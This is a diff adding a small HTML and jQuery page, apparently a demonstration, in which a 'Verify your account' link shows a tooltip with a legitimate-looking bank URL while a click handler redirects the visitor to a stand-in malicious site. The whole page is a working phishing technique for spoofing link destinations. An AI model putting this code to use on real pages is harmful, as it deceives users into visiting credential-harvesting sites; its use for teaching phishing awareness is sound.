@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fake Tooltip Example</title>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+
+<style>
+    .tooltip {
+        font-size: 14px;
+    }
+
+    .tooltip-inner {
+        background-color: #ffcc00;
+        color: #333;
+    }
+
+    .tooltip.top .tooltip-arrow {
+        border-top-color: #dc29b5;
+    }
+</style>
+
+</head>
+<body>
+    <div class="container">
+        <p>
+            Hover over this link: <a href="#" id="fakeLink" data-toggle="tooltip" data-placement="top" title="https://www.trustedbank.com/verify">Verify your account</a>
+        </p>
+    </div>
+
+    <script>
+        $(document).ready(function(){
+            // Function to dynamically change the tooltip content
+            function updateTooltipContent() {
+                var fakeTooltipContent = "https://www.trustedbank.com/verify"; // Fake tooltip content (legitimate-looking)
+                $('#fakeLink').attr('title', fakeTooltipContent); // Update the title attribute
+            }
+
+            $('[data-toggle="tooltip"]').tooltip();
+
+            // Call the function to update tooltip content when hovering over the link
+            $('#fakeLink').hover(function() {
+                updateTooltipContent();
+                $('[data-toggle="tooltip"]').tooltip('show'); // Show the tooltip
+            });
+
+            // Handle clicks on the fake link (redirect to malicious site)
+            $('#fakeLink').click(function(e) {
+                e.preventDefault(); // Prevent default link behavior (to stay on the same page for demonstration)
+                window.location.href = 'https://malicious-website.com/verify'; // Actual malicious URL
+            });
+        });
+    </script>
+</body>
+</html>
